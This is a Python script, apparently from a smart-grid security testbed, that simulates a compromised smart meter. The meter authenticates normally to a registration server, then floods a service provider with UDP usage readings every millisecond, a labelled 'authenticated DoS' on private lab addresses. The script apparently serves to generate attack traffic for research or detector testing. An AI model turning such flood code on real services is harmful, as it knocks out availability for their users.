# compromised_client.py
# Authenticates normally, then behaves maliciously (high-rate flood)

import socket
import json
import time
import random
import sys
import os

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
sys.path.insert(0, BASE_DIR)

from crypto.sm import SmartMeter

SP_IP = "10.0.3.1"
SP_PORT = 9999
REG_PORT = 9998

ATTACK_INTERVAL = 0.001  # flood
NORMAL_INTERVAL = 3


def run_compromised_sm(sm_id):
    print(f"[!] Compromised Smart Meter {sm_id}")

    # -------- NORMAL AUTH --------
    sm = SmartMeter(sm_id)
    sm.enroll()
    sm.authenticate()

    auth_payload = sm.build_auth_payload(b"AUTH_REQUEST")

    sm_num = int(sm_id[2:])
    reg_ip = "10.0.1.254" if sm_num <= 5 else "10.0.2.254"

    sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    sock.connect((reg_ip, REG_PORT))
    sock.sendall(json.dumps(auth_payload).encode())
    sock.close()

    print("[✓] Authentication SUCCESS")

    # -------- MALICIOUS BEHAVIOR --------
    udp_sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)

    print("[⚠] Switching to attack mode (authenticated DoS)")
    print("-" * 50)

    try:
        while True:
            payload = {
                "smId": sm_id,
                "usage": round(random.uniform(50, 500), 2),
                "proto": "udp",
                "service": "-",
                "timestamp": time.time()
            }

            udp_sock.sendto(json.dumps(payload).encode(), (SP_IP, SP_PORT))
            time.sleep(ATTACK_INTERVAL)

    except KeyboardInterrupt:
        udp_sock.close()
        print("\n[!] Stopped")


if __name__ == "__main__":
    run_compromised_sm(sys.argv[1])
